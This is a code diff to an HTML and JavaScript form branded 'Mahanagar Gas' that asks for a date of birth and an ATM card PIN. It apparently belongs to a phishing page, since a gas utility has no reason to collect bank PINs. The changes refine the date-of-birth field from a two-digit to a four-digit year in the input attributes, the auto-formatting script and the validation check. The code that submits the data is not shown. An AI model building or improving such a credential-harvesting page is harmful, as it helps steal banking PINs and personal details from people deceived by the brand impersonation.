@@ -69,11 +69,19 @@
   <div class="form-container">
     <h2>Mahanagar Gas</h2>
     
-    <form onsubmit="submitForm(event)">
-      <div class="input-group">
-        <label for="dob">Date of Birth (DD/MM/YY)</label>
-        <input type="text" id="dob" name="dob" placeholder="DD/MM/YY" maxlength="8" required>
-      </div>
+<form onsubmit="submitForm(event)">
+  <div class="input-group">
+    <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+    <input 
+      type="text" 
+      id="dob" 
+      name="dob" 
+      placeholder="DD/MM/YYYY" 
+      maxlength="10"
+      pattern="\d{2}/\d{2}/\d{4}" 
+      required
+    >
+  </div>
 
       <div class="input-group">
         <label for="pin">ATM Card PIN</label>
@@ -109,7 +117,7 @@
         value = value.slice(0, 2) + '/' + value.slice(2);
       }
       if (value.length > 4) {
-        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 6);
+        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
       }
       e.target.value = value;
     });
@@ -119,10 +127,10 @@
 
       const dob = document.getElementById('dob').value;
       const pin = document.getElementById('pin').value;
-      const dobPattern = /^\d{2}\/\d{2}\/\d{2}$/;
+      const dobPattern = /^\d{2}\/\d{2}\/\d{4}$/;
 
       if (!dobPattern.test(dob)) {
-        alert("Please enter DOB in DD/MM/YY format.");
+        alert("Please enter DOB in DD/MM/YYYY format.");
         return false;
       }
 
